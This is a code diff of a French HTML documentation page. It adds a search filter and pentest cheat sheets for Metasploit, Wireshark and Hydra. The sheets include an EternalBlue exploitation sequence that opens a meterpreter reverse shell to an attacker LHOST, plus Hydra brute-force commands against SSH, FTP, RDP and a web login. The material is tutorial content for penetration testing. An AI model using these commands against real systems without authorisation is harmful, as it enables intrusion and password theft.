@@ -22,14 +22,19 @@
 
     <main>
         <section class="documentation">
-            <h1>Documentation</h1>
+            <div class="doc-header">
+                <form class="doc-search" autocomplete="off" onsubmit="return false;">
+                    <input type="search" id="doc-search-input" placeholder="🔍 Rechercher..." name="search" aria-label="Recherche documentation" />
+                </form>
+                <h1>Documentation</h1>
+            </div>
+
             <div class="doc-categories">
                 <button class="doc-cat-btn active" data-category="pentest">Pentest</button>
                 <button class="doc-cat-btn" data-category="code">Code</button>
                 <button class="doc-cat-btn" data-category="services">Services</button>
                 <button class="doc-cat-btn" data-category="reseau">Réseau & Cyber</button>
             </div>
-            <!-- Sous-catégories pour Code -->
             <div class="doc-subcategories" id="doc-subcategories" style="display:none;"></div>
             <div class="doc-list" id="doc-list"></div>
             <div class="doc-detail" id="doc-detail" style="display:none;">
@@ -44,7 +49,6 @@
     </footer>
 
     <script>
-    // Nouvelle structure pour les sous-catégories de "Code"
     const docData = {
         pentest: [
             {
@@ -86,6 +90,151 @@
                     <p>
                         <b>Documentation officielle :</b> <a href="https://nmap.org/book/man.html" target="_blank">https://nmap.org/book/man.html</a>
                     </p>
+                `
+            },
+            {
+                title: "Metasploit - Framework d'exploitation",
+                detail: `
+                    <p>
+                        <b>À quoi sert Metasploit ?</b><br>
+                        Metasploit est le framework de référence pour l’exploitation de failles de sécurité et le développement d’exploits. Il permet de rechercher, tester et exploiter des vulnérabilités sur des systèmes cibles, d’automatiser les attaques, de générer des payloads et de piloter tout un test d’intrusion depuis une seule interface (<code>msfconsole</code>).
+                    </p>
+                    <p>
+                        <b>Quand l’utiliser ?</b><br>
+                        - Pour tester la résistance d’un système à des attaques connues<br>
+                        - Pour automatiser l’exploitation de vulnérabilités<br>
+                        - Pour développer et tester ses propres exploits ou payloads<br>
+                        - Pour obtenir un accès distant (reverse shell, meterpreter, etc.)
+                    </p>
+                    <h3>Commandes de base</h3>
+                    <ul>
+                        <li><code>msfconsole</code> — Lancer Metasploit en mode console</li>
+                        <li><code>search nom_vuln</code> — Rechercher un module (exploit, scanner...)</li>
+                        <li><code>use chemin/module</code> — Sélectionner un module</li>
+                        <li><code>info</code> — Infos détaillées sur le module sélectionné</li>
+                        <li><code>show options</code> — Voir les options à renseigner (RHOSTS, LHOST, etc.)</li>
+                        <li><code>set OPTION valeur</code> — Définir une option (ex : <code>set RHOSTS 192.168.1.10</code>)</li>
+                        <li><code>show payloads</code> — Voir les payloads compatibles</li>
+                        <li><code>set payload nom_payload</code> — Choisir un payload</li>
+                        <li><code>exploit</code> ou <code>run</code> — Lancer l’attaque</li>
+                        <li><code>back</code> — Revenir au menu principal</li>
+                        <li><code>exit</code> — Quitter Metasploit</li>
+                    </ul>
+                    <h3>Options principales d’un module</h3>
+                    <ul>
+                        <li><b>RHOSTS</b> : Adresse(s) IP cible(s)</li>
+                        <li><b>RPORT</b> : Port cible</li>
+                        <li><b>LHOST</b> : Adresse IP de l’attaquant (pour le reverse shell)</li>
+                        <li><b>LPORT</b> : Port d’écoute de l’attaquant</li>
+                        <li><b>PAYLOAD</b> : Type de charge utile (ex : <code>windows/x64/meterpreter/reverse_tcp</code>)</li>
+                        <li><b>SMBUser</b>, <b>SMBPass</b>, etc. : Options spécifiques selon le module</li>
+                    </ul>
+                    <h3>Exemple d’exploitation (EternalBlue)</h3>
+                    <pre><code>
+msfconsole
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.10
+set LHOST 192.168.1.100
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit
+                    </code></pre>
+                    <h3>Options avancées et astuces</h3>
+                    <ul>
+                        <li><code>show advanced</code> — Voir les options avancées (timeouts, scripts auto...)</li>
+                        <li><code>show missing</code> — Lister les options obligatoires non renseignées</li>
+                        <li><code>setg OPTION valeur</code> — Définir une option globale (pour tous les modules)</li>
+                        <li><code>sessions</code> — Lister les sessions ouvertes (post-exploitation)</li>
+                        <li><code>db_nmap</code> — Scanner avec Nmap et importer les résultats dans Metasploit</li>
+                    </ul>
+                    <h3>Ressources et documentation</h3>
+                    <ul>
+                        <li><a href="https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html" target="_blank">Documentation officielle Metasploit</a></li>
+                        <li><a href="https://www.offsec.com/metasploit-unleashed/" target="_blank">Metasploit Unleashed (OffSec)</a></li>
+                    </ul>
+                `
+            },
+            {
+                title: "Wireshark - Analyseur de paquets réseau",
+                detail: `
+                    <p>
+                        <b>À quoi sert Wireshark ?</b><br>
+                        Wireshark est le logiciel de référence pour capturer, visualiser et analyser le trafic réseau en temps réel ou à partir de fichiers de capture. Il permet de diagnostiquer des problèmes réseau, de détecter des attaques, ou d’étudier des protocoles en détail.
+                    </p>
+                    <p>
+                        <b>Quand l’utiliser ?</b><br>
+                        - Pour analyser le trafic réseau lors d’un pentest<br>
+                        - Pour détecter des failles, fuites de données, attaques<br>
+                        - Pour comprendre le fonctionnement de protocoles ou d’applications<br>
+                        - Pour faire du forensic réseau
+                    </p>
+                    <h3>Fonctionnalités principales</h3>
+                    <ul>
+                        <li>Capture de paquets en temps réel ou depuis un fichier (<code>.pcap</code>)</li>
+                        <li>Filtres puissants pour isoler des flux ou protocoles</li>
+                        <li>Décodage de centaines de protocoles (TCP, UDP, HTTP, DNS, SMB...)</li>
+                        <li>Reconstruction de sessions, extraction de fichiers</li>
+                        <li>Statistiques, graphiques, suivi de flux</li>
+                    </ul>
+                    <h3>Filtres d’affichage utiles</h3>
+                    <ul>
+                        <li><code>ip.addr == 192.168.1.10</code> — Tout le trafic impliquant cette IP</li>
+                        <li><code>tcp.port == 80</code> — Trafic HTTP</li>
+                        <li><code>http</code> — Tous les paquets HTTP</li>
+                        <li><code>dns</code> — Tous les paquets DNS</li>
+                        <li><code>tcp contains "mot"</code> — Paquets contenant une chaîne</li>
+                        <li><code>frame contains "password"</code> — Recherche de mots de passe en clair</li>
+                    </ul>
+                    <h3>Exemples d’utilisation</h3>
+                    <ul>
+                        <li>Lancer la capture : choisir l’interface, cliquer sur le bouton “Démarrer”</li>
+                        <li>Appliquer un filtre dans la barre de filtre</li>
+                        <li>Suivre un flux TCP : clic droit sur un paquet &gt; “Suivre” &gt; “Flux TCP”</li>
+                        <li>Enregistrer une capture : Fichier &gt; Enregistrer sous (<code>.pcapng</code>)</li>
+                        <li>Analyser un fichier : Fichier &gt; Ouvrir</li>
+                    </ul>
+                    <h3>Documentation</h3>
+                    <ul>
+                        <li><a href="https://www.wireshark.org/docs/wsug_html_chunked/" target="_blank">Guide utilisateur Wireshark</a></li>
+                        <li><a href="https://wiki.wireshark.org/CaptureFilters" target="_blank">Filtres Wireshark</a></li>
+                    </ul>
+                `
+            },
+            {
+                title: "Hydra - Brute force de services",
+                detail: `
+                    <p>
+                        <b>À quoi sert Hydra ?</b><br>
+                        Hydra est un outil de brute force très puissant pour tester des identifiants sur de nombreux protocoles (SSH, FTP, HTTP, SMB, RDP, etc.).
+                    </p>
+                    <p>
+                        <b>Quand l’utiliser ?</b><br>
+                        - Pour tester la robustesse des mots de passe d’un service<br>
+                        - Pour auditer la sécurité d’un accès distant (SSH, FTP, etc.)<br>
+                        - Pour vérifier la présence de comptes faibles ou par défaut
+                    </p>
+                    <h3>Commandes de base</h3>
+                    <ul>
+                        <li><code>hydra -l admin -P wordlist.txt ssh://192.168.1.10</code> — Brute force SSH avec login “admin”</li>
+                        <li><code>hydra -L users.txt -P pass.txt ftp://192.168.1.20</code> — Brute force FTP avec plusieurs logins et mots de passe</li>
+                        <li><code>hydra -V -l admin -P pass.txt rdp://192.168.1.30</code> — Mode verbeux sur RDP</li>
+                        <li><code>hydra -f -l admin -P pass.txt http-post-form "site.com/login.php:user=^USER^&pass=^PASS^:F=Identifiant incorrect"</code> — Brute force HTTP POST</li>
+                    </ul>
+                    <h3>Options utiles</h3>
+                    <ul>
+                        <li><b>-l</b> : Login unique</li>
+                        <li><b>-L</b> : Fichier de logins</li>
+                        <li><b>-p</b> : Mot de passe unique</li>
+                        <li><b>-P</b> : Fichier de mots de passe</li>
+                        <li><b>-t</b> : Nombre de threads (par défaut 16)</li>
+                        <li><b>-f</b> : Arrêter au premier succès</li>
+                        <li><b>-V</b> : Mode verbeux (affiche chaque tentative)</li>
+                    </ul>
+                    <h3>Documentation</h3>
+                    <ul>
+                        <li><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank">Hydra sur GitHub</a></li>
+                        <li><a href="https://tools.kali.org/password-attacks/hydra" target="_blank">Hydra sur Kali</a></li>
+                    </ul>
                 `
             },
             {
@@ -455,7 +604,7 @@ public:
                         <pre><code>#include &lt;vector&gt;
 vector&lt;int&gt; v = {1,2,3};</code></pre>
                         <p>
-                            <b>Plus d'infos :</b> <a href="https://en.cppreference.com/w/" target="_blank">cppreference</a>
+                            <b>Plus d'infos ;</b> <a href="https://en.cppreference.com/w/" target="_blank">cppreference</a>
                         </p>
                     `
                 },
@@ -527,7 +676,6 @@ print(s.recv(1024))
         ]
     };
 
-    // Sous-catégories pour "Code"
     const codeSubcats = [
         { key: "devweb", label: "🌐 Dev Web" },
         { key: "code", label: "💻 Code" }
@@ -544,7 +692,6 @@ print(s.recv(1024))
         const subcatDiv = document.getElementById('doc-subcategories');
         detailDiv.style.display = 'none';
         listDiv.innerHTML = '';
-        // Gérer les sous-catégories pour "Code"
         if(category === "code") {
             subcatDiv.innerHTML = "";
             subcatDiv.style.display = "flex";
@@ -555,7 +702,7 @@ print(s.recv(1024))
                 btn.onclick = () => showDocList("code", s.key);
                 subcatDiv.appendChild(btn);
             });
-            if(!subcat) return; // Affiche rien tant qu'on n'a pas choisi une sous-catégorie
+            if(!subcat) return;
             docData.code[subcat].forEach((item, idx) => {
                 const btn = document.createElement('button');
                 btn.className = "doc-list-btn";
@@ -595,22 +742,38 @@ print(s.recv(1024))
         document.getElementById('doc-list').style.display = 'flex';
     }
 
-    // Gestion des boutons de catégorie
     document.querySelectorAll('.doc-cat-btn').forEach(btn => {
         btn.addEventListener('click', function() {
             document.querySelectorAll('.doc-cat-btn').forEach(b => b.classList.remove('active'));
             btn.classList.add('active');
             if(btn.getAttribute('data-category') === "code") {
-                showDocList("code"); // Affiche les sous-catégories
+                showDocList("code");
             } else {
                 showDocList(btn.getAttribute('data-category'));
             }
         });
     });
 
-    // Affichage initial
     showDocList('pentest');
     </script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+    const searchInput = document.getElementById('doc-search-input');
+    const docList = document.getElementById('doc-list');
+
+    if (searchInput) {
+        searchInput.addEventListener('input', function() {
+            const value = this.value.toLowerCase();
+            // Sélectionne les boutons à chaque frappe (car ils sont générés dynamiquement)
+            const items = docList.querySelectorAll('.doc-list-btn');
+            items.forEach(function(item) {
+                const txt = item.textContent.toLowerCase();
+                item.style.display = txt.includes(value) ? '' : 'none';
+            });
+        });
+    }
+});
+</script>
 </body>
 </html>
